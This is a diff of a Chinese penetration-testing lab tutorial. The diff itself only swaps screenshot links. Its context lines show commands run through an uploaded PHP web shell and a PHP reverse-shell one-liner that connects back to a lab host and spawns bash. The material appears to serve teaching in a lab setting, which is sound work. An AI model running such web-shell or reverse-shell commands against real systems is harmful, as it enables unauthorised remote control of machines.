@@ -105,8 +105,6 @@ http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php
 http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
 ```
 
-![执行命令](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)
-
 可以看到，`id`命令执行成功。
 
 ## 反弹shell
@@ -117,11 +115,11 @@ http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
 php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
-![生成反弹shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)
+![生成反弹shell](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)
 
 在网页上直接执行：
 
-![执行反弹shell](https://static.nextcyber.cn/attachments/images/course/task/6afd4aa394684066b242477e95f55c42.png)
+![执行反弹shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)
 
 成功拿到`shell`。
 
